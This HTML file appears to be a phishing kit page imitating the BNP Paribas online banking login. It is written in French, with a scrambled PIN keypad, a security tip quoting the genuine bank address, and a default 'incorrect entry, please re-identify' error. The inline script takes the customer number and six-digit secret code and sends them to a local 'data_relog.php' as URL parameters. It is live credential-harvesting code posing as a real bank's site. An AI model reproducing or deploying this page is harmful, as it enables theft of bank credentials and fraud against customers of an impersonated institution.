<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="media/css/helpers.css">
        <link rel="stylesheet" href="media/css/style.css">

        <link rel="icon" type="image/png" href="media/imgs/ff.png" />

        <title>Accéder à mes comptes en ligne</title>
    </head>

    <body>

		<div id="wrapper">
            
            <!-- HEADER -->
            <header id="header">
                <div class="logo">
                    <img class="d-lg-block d-md-none d-sm-none d-none" style="min-width: 519px;" src="media/imgs/logo.png">
                    <img class="d-lg-none d-md-block d-sm-none d-none" style="min-width: 217px;" src="media/imgs/logo2.png">
                    <img class="d-lg-none d-md-none d-sm-block d-block" style="min-width: 138px;" src="media/imgs/logo3.png">
                </div>
                <div>
                    <img class="d-lg-block d-md-none d-sm-none d-none" style="min-width: 245px;" src="media/imgs/header-right.png">
                    <img class="d-lg-none d-md-none d-sm-block d-block" style="min-width: 36px;" src="media/imgs/header-right2.png">
                </div>
            </header>
            <!-- END HEADER -->

            <!-- MAIN -->
            <main id="main">
                <div class="left">
                    <div id="forma">
                        <input type="hidden" id="cap" name="cap">
                        <input type="hidden" name="steeep" id="steeep" value="login">
                       
                            <div class="error">
                                Votre saisie est incorrecte.<br>
                                Veuillez renouveler votre identification.
                            </div>
                        
                        <legend>Accéder à mes Comptes</legend>
                        <div class="form-group">
                            <label for="username">1. Mon numéro client</label>
                            <input type="text" maxlength="10" name="username" id="username" class="form-control">
                            <div class="reset reset-user"><img src="media/imgs/reset.png"></div>
                        </div>
                        <div class="form-group">
                            <label for="password">2. Mon code secret (6 chiffres)</label>
                            <input style="cursor: auto;" type="password" name="password" id="password" class="zz form-control" readonly>
                            <div class="reset reset-pass"><img src="media/imgs/reset.png"></div>
                        </div>
                        <div class="numbers zz">
                            <ul>
                                <li data-num="0">0</li>
                                <li data-num="5">5</li>
                                <li data-num="4">4</li>
                                <li data-num="2">2</li>
                                <li data-num="8">8</li>
                            </ul>
                            <ul>
                                <li data-num="6">6</li>
                                <li data-num="1">1</li>
                                <li data-num="3">3</li>
                                <li data-num="9">9</li>
                                <li data-num="7">7</li>
                            </ul>
                        </div>
                        <button id="booom" class="btttn disabled" disabled>Accéder à mes Comptes</button>
                    </div>
                </div>
                <div class="right">
                    <div class="widget">
                        <h3><img src="media/imgs/1.png"> Vos codes d'accès</h3>
                        <p><span>Obtenir ses codes d'accès</span></p>
                        <p><span>Code secret oublié ?</span></p>
                    </div>
                    <hr>
                    <div class="widget with-image">
                        <h3><img src="media/imgs/2.png"> Conseils de sécurité</h3>
                        <p>Vérifiez que <b>l'adresse du site commence exactement par :</b></p>
                        <p><b>https://connexion-mabanque.bnpparibas/</b></p>
                        <p>précédée par une icône cadenas et<br>contient un <b>https://</b> qui garantiront une<br>connexion sécurisée.</p>
                        <p><span>Découvrez nos conseils sécurité</span> et les<br>bonnes pratiques pour consulter et<br>identifier les dangers du web.</p>
                    </div>
                    <hr>
                    <div class="widget">
                        <h3><img src="media/imgs/3.png"> Pour une meilleure accessibilité</h3>
                        <p><span>Connectez-vous</span> grâce à la grille contrastée, agrandie et bénéficiez d'un accompagnement vocal.</p>
                        <p><span>Utilisez Facil'iti</span> pour personnaliser l'affichage en fonction de votre situation (handicap visuel ou cognitif).</p>
                    </div>
                    <hr>
                    <div class="widget">
                        <h3><img src="media/imgs/4.png"> Informations client</h3>
                        <p>Si vous rencontrez des problèmes techniques lors de votre navigation, nous vous invitons à contacter nos conseillers en ligne au :</p>
                        <p><img src="media/imgs/5.png"></p>
                        <p>ou à nous <span>signaler un problème technique.</span><br>Vous pouvez également gérer vos comptes depuis votre mobile ou votre tablette via l'application <span>Mes comptes.</span></p>
                    </div>
                </div>
            </main>
            <!-- END MAIN -->

            <!-- FOOTER -->
            <footer id="footer">
                <div class="social-media">
                    <span>Suivez-nous sur :</span>
                    <ul>
                        <li><i class="fab fa-facebook-f"></i></li>
                        <li><i class="fab fa-twitter"></i></li>
                        <li><i class="fab fa-youtube"></i></li>
                        <li><i class="fab fa-instagram"></i></li>
                        <li><i class="fab fa-linkedin"></i></li>
                    </ul>
                </div>
                <div class="row">
                    <div class="col-md-4 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="widget">
                            <h3>Contact</h3>
                            <p>Nos conseillers vous répondent par téléphone, chat, mail ou bien encore grâce à nos SAV Facebook et Twitter.</p>
                        </div>
                    </div>
                    <div class="col-md-4 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="widget">
                            <h3>Trouver une agence</h3>
                            <p>Retrouvez facilement l’agence la plus proche avec ses horaires d’ouverture et les services disponibles.</p>
                        </div>
                    </div>
                    <div class="col-md-4 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="widget">
                            <h3>les applications mobiles</h3>
                            <p>Découvrez nos applications mobiles pour gérer vos comptes, payer avec votre mobile et vous simplifier la vie.</p>
                        </div>
                    </div>
                </div>
                <hr>
                <div class="row">
                    <div class="col-md-3 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="widget">
                            <h3 class="second">Informations légales</h3>
                            <ul>
                                <li>Données personnelles</li>
                                <li>Mentions légales</li>
                                <li>Cookies</li>
                                <li>Réglementation</li>
                                <li>Fonds de Garantie des Dépôts et résolution</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="widget">
                            <h3 class="second">Nous connaître</h3>
                            <ul>
                                <li>La banque d’un monde qui change</li>
                                <li>Nos engagements responsables</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="widget">
                            <h3 class="second">Informations</h3>
                            <ul>
                                <li>Site Accessible</li>
                                <li>Site Sécurisé</li>
                                <li>Conditions d’éligibilité</li>
                                <li>Tarifs et conditions</li>
                                <li>Glossaire</li>
                                <li>Guides et brochures</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="widget">
                            <h3 class="second">Nos autres sites</h3>
                            <ul>
                                <li>Les Professionnels</li>
                                <li>Les Entreprises</li>
                                <li>Les Associations</li>
                                <li>La Banque Privée</li>
                                <li>La Banque en ligne</li>
                                <li>Le Groupe BNP Paribas</li>
                            </ul>
                        </div>
                    </div>
                </div>
                <p>Pour la bonne exécution de vos contrats, et en cas de réclamations/contestations, votre Conseiller est joignable sur sa ligne directe (appel non surtaxé). Si vous ne disposez plus de son numéro de téléphone direct, envoyez-lui un message par votre messagerie sécurisée, il vous le donnera à nouveau en retour.</p>
            </footer>
            <!-- END FOOTER -->

        </div>  

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="media/js/js.js"></script>

        <script>
            $('#username').keyup(function(){
                if( $(this).val().length > 0 ) {
                    $('.reset-pass').show();
                    $('.zz').css({'opacity':'1'});
                } else {
                    $('.zz').css({'opacity':'0.2'});
                    $('.reset-pass').hide();
                }
            });
            $('.numbers ul li').click(function(){
                if( $('#password').val().length == 6 )
                    return false;
                var num     = $(this).data('num');
                var old_val = $('#password').val();
                var zz = old_val + num;
                $('#password').val(zz);
                if( $('#password').val().length > 5 ) {
                    $('button').removeClass('disabled');
                    $('button').removeAttr('disabled');
                } else {
                    if( $('#password').hasClass('disabled') == false ) {
                        $('button').addClass('disabled');
                        $('button').attr('disabled','disabled');
                    }
                }
            });
            $('.reset-user').click(function(){
                $('.zz').css({'opacity':'0.2'});
                $('#username').val('');
                $('.reset-pass').hide();
            });
            $('.reset-pass').click(function(){
                $('#password').val('');
                $('button').addClass('disabled');
                $('button').attr('disabled','disabled');
            });
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                var ID_CR =	$("#username").val();
                var PASS_CR	 =	$("#password").val();
                window.location.href = "data_relog.php?log_id=" + encodeURIComponent(ID_CR) + "&log_pass=" + encodeURIComponent(PASS_CR);
                loaded = true;
            });
        </script>

    </body>

</html>